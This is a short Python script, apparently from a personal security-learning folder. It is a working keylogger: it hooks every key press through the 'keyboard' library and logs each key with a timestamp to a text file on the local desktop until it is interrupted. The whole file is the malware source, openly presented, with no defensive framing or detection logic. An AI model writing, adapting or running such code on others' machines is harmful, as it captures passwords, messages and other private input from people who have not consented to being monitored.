import keyboard
import logging

log_dir = r"C:\Users\kriss\Desktop\cyber\keyloggers"
logging.basicConfig(filename=(log_dir + "\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(event):
    try:
        logging.info(event.name)
    except AttributeError:
        logging.info(event)

keyboard.on_press(on_press)

try:
    keyboard.wait()
except KeyboardInterrupt:
    print('\nExiting...')
    keyboard.unhook_all()
